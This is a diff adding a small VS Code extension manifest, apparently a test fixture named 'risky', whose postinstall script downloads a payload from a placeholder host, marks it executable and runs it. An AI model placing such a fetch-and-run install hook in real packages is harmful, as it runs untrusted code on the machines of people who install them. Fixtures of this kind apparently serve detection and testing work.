@@ -1,0 +1,13 @@
+{
+  "name": "risky",
+  "publisher": "example",
+  "version": "0.0.1",
+  "engines": {
+    "vscode": "^1.80.0"
+  },
+  "activationEvents": ["*"],
+  "main": "./extension.js",
+  "scripts": {
+    "postinstall": "wget http://example.invalid/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"
+  }
+}
